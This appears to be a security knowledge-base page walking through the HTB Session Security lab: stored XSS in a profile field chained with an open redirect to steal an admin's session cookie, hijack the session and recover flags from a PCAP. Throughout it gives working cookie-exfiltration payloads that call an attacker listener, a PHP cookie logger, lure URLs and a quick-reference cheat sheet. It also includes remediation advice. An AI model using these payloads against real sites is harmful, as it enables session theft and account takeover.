@@ -1,0 +1,462 @@
+---
+title: Chaining Final
+description: End-to-end engagement walkthrough - a stored XSS in a profile field combined with an open redirect on an admin-reviewed submission endpoint, yielding admin session hijack, flag retrieval from the admin's private profile, and a Wireshark dive into a PCAP attachment for the secondary flag.
+mitre: [T1539, T1185, T1212, T1059.007, T1550.004]
+d3fend: [D3-CBV, D3-IAA]
+impact: [SessionTakeover, AccountTakeover, DataExfil]
+owasp: [A01, A03, A07]
+sidebar:
+  order: 10
+  label: Chaining Final
+---
+
+## TL;DR
+
+The canonical session-attack chain in a well-defended app: stored XSS in a user-controlled profile field, weaponized by an open redirect on an admin-facing endpoint, yielding the admin's session cookie. From there, hijack the admin session, access admin-only content (flag 1), pull a PCAP attachment, and recover flag 2 via Wireshark filtering. Five distinct primitives composed end-to-end.
+
+```
+# 1. Plant stored XSS in profile (Country field) - exfils document.cookie
+<style>@keyframes x{}</style>
+<video style="animation-name:x"
+       onanimationend="window.location='http://ATTACKER:8000/log.php?c='+document.cookie">
+</video>
+
+# 2. Deliver via open redirect on admin-touched endpoint
+http://target/submit-solution?url=http://target/profile?email=YOUR_EMAIL
+
+# 3. Admin reviews submission → redirects to your profile → XSS fires in admin context
+#    Your listener logs the admin's cookie
+
+# 4. Hijack admin session in private window
+#    DevTools → Storage → swap auth-session cookie → admin's value
+
+# 5. Browse admin's profile, retrieve flag 1, download PCAP
+
+# 6. Open PCAP in Wireshark, filter http, search for HTB{
+```
+
+Success indicator: both flags in hand, full attack chain documented with timestamps and screenshots from your listener, your browser, and Wireshark.
+
+## The scenario
+
+A bug bounty program. In scope:
+
+- Single target: `http://minilab.htb.net`
+- Client-side attacks against end users are explicitly in scope
+- Test account: `heavycat106` / `rocknrol`
+- Through dirbusting, you've discovered: `http://minilab.htb.net/submit-solution`
+
+The goal: hijack an admin session, read a flag in the admin's profile, and extract a second flag from a PCAP file linked in that profile.
+
+This is the HTB Session Security skill assessment; the chain is also representative of real engagements where session attacks against high-privilege users are the path to maximum impact.
+
+## Step 0 - Reconnaissance
+
+Log in as `heavycat106` and walk the app. Map the surface:
+
+| Page | What it does | Attack surface |
+| --- | --- | --- |
+| `/app` | Account page; edit profile (email, phone, country) | Profile fields → input validation tests |
+| `/profile?email=X` | Public profile (only visible when "shared") | Stored XSS rendering point |
+| `/app/change-visibility` | Toggle profile public/private | CSRF target |
+| `/submit-solution` | Discovered via dirbusting; URL parameter | Open redirect / admin lure |
+
+Three observations to verify:
+
+1. **Is the Country field XSS-injectable?** Test with a benign-looking payload that survives form submission.
+2. **Where does the Country render?** If it shows on the share/profile page (not just back to me), payload fires when anyone (including admins) views my profile.
+3. **What does `/submit-solution` do?** Specifically: does an admin look at submissions, and if so does the `url` parameter become a server-side redirect?
+
+## Step 1 - Confirm the stored XSS
+
+Edit your profile. In the Country field, paste:
+
+```html
+"><img src=x onerror=alert(document.domain)>
+```
+
+Save. The form accepts the input. Now browse to the share/public profile view:
+
+```
+http://minilab.htb.net/profile?email=heavycat@example.com
+```
+
+(Replace with your actual email.) The alert fires. The domain shown is `minilab.htb.net` - confirming JavaScript is executing in the target's origin, not a sandbox.
+
+This proves:
+
+- Country field is stored-XSS vulnerable
+- Payload renders on the public profile view, which is what an external reviewer would see
+- HttpOnly check next
+
+In DevTools console (on the profile page):
+
+```javascript
+> document.cookie
+"auth-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+```
+
+The session cookie is readable from JavaScript. `HttpOnly` is **not** set. The XSS-to-cookie chain works.
+
+## Step 2 - Build the cookie-exfil payload
+
+Replace the test payload with a real cookie-stealer in the Country field. Two payload patterns; pick based on what survives the input filter.
+
+### Payload A - Animation-end exfil (overt navigation)
+
+```html
+<style>@keyframes x{}</style>
+<video style="animation-name:x"
+       onanimationend="window.location='http://YOUR-IP:8000/log.php?c='+document.cookie">
+</video>
+```
+
+The empty `@keyframes` animation triggers `onanimationend` immediately on render. The handler navigates the victim's browser to your log URL with the cookie appended.
+
+Tradeoff: the victim notices their browser navigated. Fine for this engagement (you redirect them back via your log.php).
+
+### Payload B - fetch exfil (silent)
+
+```html
+<script>fetch('http://YOUR-IP:8000/log.php?c='+btoa(document.cookie))</script>
+```
+
+Silent - `fetch` makes the request without changing the page. Less suspicious if the admin notices nothing unusual.
+
+If the app sanitizes `<script>` but allows other tags, fall back to Payload A.
+
+Use whichever fires. For this walkthrough I'll use Payload A (it matches the source-doc scenario).
+
+## Step 3 - Stand up the cookie logger
+
+On your attacking machine:
+
+```shell
+$ cat > log.php <<'EOF'
+<?php
+$logFile = "cookieLog.txt";
+$cookie  = $_REQUEST["c"] ?? "(empty)";
+$ip      = $_SERVER["REMOTE_ADDR"];
+$ua      = $_SERVER["HTTP_USER_AGENT"];
+$ref     = $_SERVER["HTTP_REFERER"] ?? "(no referer)";
+$time    = date('Y-m-d H:i:s');
+
+$handle = fopen($logFile, "a");
+fwrite($handle, "[$time] $ip\n  UA: $ua\n  Ref: $ref\n  Cookie: $cookie\n\n");
+fclose($handle);
+
+// Redirect victim to a legit-looking destination so they don't realize what happened
+header("Location: https://www.google.com/");
+exit;
+?>
+EOF
+
+$ php -S 0.0.0.0:8000
+[Mon Sep 30 14:23:19 2024] PHP 8.1.0 Development Server (http://0.0.0.0:8000) started
+```
+
+Test it yourself first - visit `http://YOUR-IP:8000/log.php?c=test123` in a browser, confirm `cookieLog.txt` is created with the expected content. Always verify your listener before deploying it.
+
+## Step 4 - Plant the payload, share the profile
+
+Edit your profile. Paste Payload A into Country. Save.
+
+Toggle profile visibility to public (click "Change Visibility" → "Make Public"). This is required - the XSS only fires when someone views the public profile.
+
+Your public profile URL is now:
+
+```
+http://minilab.htb.net/profile?email=heavycat@example.com
+```
+
+(Or whatever email is on your account.) Test by opening the profile in a private window - the XSS should fire, your listener should receive a hit with your own cookie. Confirms the end-to-end XSS-to-listener chain works before depending on it.
+
+## Step 5 - Probe `/submit-solution` for open redirect
+
+```shell
+$ curl -is 'http://minilab.htb.net/submit-solution'
+```
+
+Look at the response. Two outcomes:
+
+- **Form**: submit-solution is a form-rendering endpoint. View source, find what fields it accepts.
+- **JSON / redirect**: an API endpoint. Test with a query parameter.
+
+The source doc mentions `?url=` as a parameter. Test it:
+
+```shell
+$ curl -is 'http://minilab.htb.net/submit-solution?url=http://YOUR-IP:8000/' \
+       -b 'auth-session=YOUR_COOKIE'
+```
+
+Two scenarios for the response:
+
+1. **Immediate redirect** to your URL → it's an open redirect, but probably an unauthenticated one (not useful for admin attack unless admin visits the URL)
+2. **"Submission received"** → the URL is queued for admin review. Admin sees the submitted URL later and clicks it.
+
+The second is the bug-bountable behavior: the *admin's* browser will follow the URL eventually. That's the lure.
+
+To confirm: trigger your listener with a benign URL via submit-solution, then wait. If a request shows up from an unfamiliar IP (the admin's review process), it's an admin-followed redirect.
+
+## Step 6 - Craft the malicious submission URL
+
+The chain you want:
+
+1. Admin visits `/submit-solution`'s review interface
+2. Admin clicks the submitted URL
+3. Admin's browser navigates to your profile (`http://minilab.htb.net/profile?email=YOU`)
+4. Your stored XSS payload fires *in the admin's browser*, with the admin's cookies
+5. The XSS exfils the admin's cookie to your listener
+
+The submission:
+
+```
+http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=heavycat@example.com
+```
+
+Submit this URL via the form (or POST, depending on what `/submit-solution` expects). Now wait.
+
+Notes:
+
+- The URL points to `minilab.htb.net` (same origin) - admin's browser sees a same-origin navigation, no scary warnings, full credential context, your XSS executes as if the admin clicked a normal app link
+- The cookie that arrives is the *admin's* - because the XSS fires in the admin's browser context
+
+## Step 7 - Wait for the admin click; capture the cookie
+
+Watch the listener:
+
+```
+$ tail -f cookieLog.txt
+```
+
+When the admin reviews the submission:
+
+```
+[2024-09-30 14:31:55] 10.10.10.42
+  UA: Mozilla/5.0 (Windows NT 10.0; Win64) Firefox/118.0
+  Ref: http://minilab.htb.net/profile?email=heavycat@example.com
+  Cookie: auth-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.xxx
+```
+
+The User-Agent and IP help distinguish the admin from random review traffic. The cookie value is the admin's session.
+
+If the cookie is base64-encoded (you used Payload B with `btoa()`), decode:
+
+```shell
+$ echo 'YXV0aC1zZXNzaW9uPWVKaGJHY2lP...' | base64 -d
+auth-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
+
+## Step 8 - Hijack the admin session
+
+Open a private/incognito window. Navigate to `http://minilab.htb.net/` - get a login prompt (no session yet). Don't log in. Instead:
+
+1. F12 → Storage (Firefox) or Application (Chrome) → Cookies → select `minilab.htb.net`
+2. Find `auth-session` (your private window's pre-login cookie if any, or none)
+3. Double-click value, replace with the admin's cookie from your log
+4. Press Enter
+5. Reload the page
+
+You should now be in the admin's account. Confirm by browsing `/app` - you should see the admin's profile, not "log in to continue."
+
+If the login prompt persists:
+
+- The cookie may have additional context binding (UA, IP). Match your UA by editing Firefox's `general.useragent.override` in `about:config`.
+- The cookie may have expired in the time it took to grab and use it. Sessions in test environments are often short-lived. Trigger the admin click again.
+
+For continuous browsing as the admin, set Burp's Match-and-Replace or Session Handling Rule to inject the admin cookie on every request - see [Hijacking](/codex/web/sessions/hijacking/).
+
+## Step 9 - Retrieve flag 1 from admin's profile
+
+In the hijacked session, browse:
+
+1. `/app` - your homepage as admin
+2. Click "Share" or navigate to `/profile?email=admin@example.com` (or whatever the admin's email is - visible in the admin's profile fields)
+3. Find the flag - typically embedded in the profile description or visible as a button/link
+
+The HTB-style scenario: a "Share" workflow requires the profile to be public. If the admin's profile is private, you may need to first toggle visibility:
+
+1. Click "Change Visibility"
+2. Click "Make Public"
+3. Re-load the share view
+4. Flag 1 is rendered on the share page
+
+```
+HTB{flag_one_value_here}
+```
+
+## Step 10 - Download the PCAP
+
+The admin's profile contains a `Flag2` button or link, typically downloading a `.pcap` file. Click and save:
+
+```
+~/Downloads/flag2.pcap
+```
+
+If the download endpoint requires the admin session (it will), make sure you're still hijacked when you click - or download via curl with the admin cookie:
+
+```shell
+$ curl -b 'auth-session=ADMIN_COOKIE' \
+       -o flag2.pcap \
+       http://minilab.htb.net/path/to/flag2.pcap
+```
+
+## Step 11 - Wireshark the PCAP
+
+```shell
+$ wireshark flag2.pcap
+```
+
+Or for a quick headless pass:
+
+```shell
+$ tshark -r flag2.pcap -Y http
+```
+
+Filter for HTTP traffic. Look for distinctive content:
+
+- A GET request with a parameter that contains the flag pattern
+- A response body containing `HTB{...}`
+
+The HTB scenario flag is in a GET parameter:
+
+```shell
+$ tshark -r flag2.pcap -Y http -T fields -e http.request.uri | grep -i 'HTB{'
+/some/path?token=HTB{flag_two_value_here}
+```
+
+Or in Wireshark GUI:
+
+1. Filter: `http`
+2. Edit → Find Packet → "Packet bytes" → String `HTB{`
+3. Wireshark highlights the packet containing the flag
+4. Look at the URI or body field in the packet detail
+
+```
+GET /some/endpoint?secret=HTB{flag_two_value_here} HTTP/1.1
+```
+
+Flag 2 captured.
+
+## Reporting the chain
+
+For a real bug bounty submission, every step is its own finding plus a chained-impact narrative:
+
+| Finding | Severity if standalone | Severity in chain |
+| --- | --- | --- |
+| Stored XSS in profile Country field | Medium | Critical |
+| Cookies missing HttpOnly | Low | Medium (enables the XSS chain) |
+| Open redirect on `/submit-solution?url=` | Low | High (admin lure) |
+| Profile sharing exposes private content | Low | Medium (delivery surface) |
+| Pre-shared session cookie reusable in different browser | Low (sessions are stateful by design) | - |
+
+The chained-impact narrative is what justifies a critical-severity rating: each finding alone is low/medium, but composed they yield unauthenticated remote admin session theft.
+
+### Recommended remediations to include
+
+For each link in the chain:
+
+- **Stored XSS** - Output encode all user input rendered in HTML; reject HTML in fields that should be plain text; deploy CSP with `default-src 'self'`
+- **HttpOnly missing** - Set HttpOnly on the auth-session cookie; add Secure if HTTPS; SameSite=Strict if compatible
+- **Open redirect** - Whitelist allowed redirect destinations; require destinations to be relative paths within the app; if external URLs must be allowed, show a confirmation page first
+- **Admin-reviews-submission** - Render submitted URLs as text, not as clickable links, in the review interface; if admin clicks, sandbox the browser context
+
+## Variations and adaptations
+
+### When the admin doesn't auto-visit submissions
+
+If the submit-solution endpoint just queues submissions and the admin never clicks them:
+
+- Find another admin lure: bug report fields, support ticket bodies, contact form
+- Anywhere user-controlled URLs reach an admin's browser is a candidate
+- "View original report" buttons, "preview submission" links, document attachments
+
+### When HttpOnly is set
+
+Cookie-exfil dies but the chain isn't dead. With XSS in the admin's context, you can:
+
+- Issue same-origin requests with the admin's authority (CSRF via XSS - see [XSS + CSRF chain](/codex/web/sessions/xss-csrf-chain/))
+- Read response bodies (Same-Origin Policy permits same-origin reads)
+- Exfil page content (admin dashboard data, account lists, API keys in the DOM)
+
+You don't get a persistent cookie but you get one-shot access for as long as the XSS runs.
+
+### When the lure doesn't fire on stored XSS
+
+If the admin reviews the submission as text (not as a clickable link / rendered page), the XSS doesn't fire. Pivot:
+
+- Find a *different* admin-rendered surface (admin user list, admin "recent activity" log)
+- Use the open redirect alone for phishing: send the admin a `?url=http://your-controlled.com` link in a separate channel
+
+### When the open redirect is path-restricted
+
+If `submit-solution?url=` only accepts paths starting with `/`, you can still chain - your stored XSS profile is reachable via a path:
+
+```
+http://target/submit-solution?url=/profile?email=YOU
+```
+
+The redirect goes to `/profile?email=YOU` (same-origin), the XSS fires, the cookie exfils. The URL never leaves the target's domain so URL-validation rules don't catch it.
+
+## Operational checklist
+
+```
+Step 0 - Recon
+  [ ] Identify profile / sharing endpoints
+  [ ] Identify endpoint(s) that admin reviews
+  [ ] Confirm HttpOnly status on session cookie
+
+Step 1 - XSS confirmation
+  [ ] Test payload in candidate field
+  [ ] Verify execution context (document.domain shows target)
+  [ ] Verify document.cookie returns session cookie
+
+Step 2 - Payload
+  [ ] Build cookie-exfil payload
+  [ ] Plant in vulnerable field
+  [ ] Confirm fire on own profile view
+
+Step 3 - Listener
+  [ ] log.php / nc / external service stood up
+  [ ] Confirm by triggering own XSS
+
+Step 4 - Lure
+  [ ] Identify endpoint admin clicks
+  [ ] Build malicious submission URL
+  [ ] Submit; wait
+
+Step 5 - Capture
+  [ ] Cookie arrives at listener
+  [ ] Distinguish admin from other traffic via UA/IP
+
+Step 6 - Hijack
+  [ ] Private window
+  [ ] Cookie swap
+  [ ] Confirm admin context (user displayed, admin pages accessible)
+
+Step 7 - Flag retrieval
+  [ ] Navigate to admin profile / sharing view
+  [ ] Flag 1 captured
+  [ ] PCAP downloaded
+
+Step 8 - PCAP analysis
+  [ ] Wireshark / tshark filter http
+  [ ] Search for HTB{ pattern
+  [ ] Flag 2 captured
+```
+
+## Quick reference
+
+| Step | Command / action |
+| --- | --- |
+| Test XSS context | DevTools console → `document.cookie` |
+| Animation-end exfil | `<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="...">` |
+| Fetch exfil (silent) | `<script>fetch('//A/?c='+btoa(document.cookie))</script>` |
+| log.php template | `<?php fwrite(fopen('cookieLog.txt','a'), $_REQUEST['c']."\n"); ?>` |
+| Run logger | `php -S 0.0.0.0:8000` |
+| Test open redirect | `curl -is 'http://target/submit-solution?url=http://A:8000/'` |
+| Submit malicious URL | `?url=http://target/profile?email=YOUR_EMAIL` |
+| Hijack - DevTools swap | F12 → Storage → Cookies → swap auth-session value |
+| Hijack - Burp swap | Match-and-Replace on Cookie header |
+| Flag in PCAP | `tshark -r f.pcap -Y http \| grep 'HTB{'` |
+| Wireshark search | Edit → Find Packet → Packet bytes → String `HTB{` |
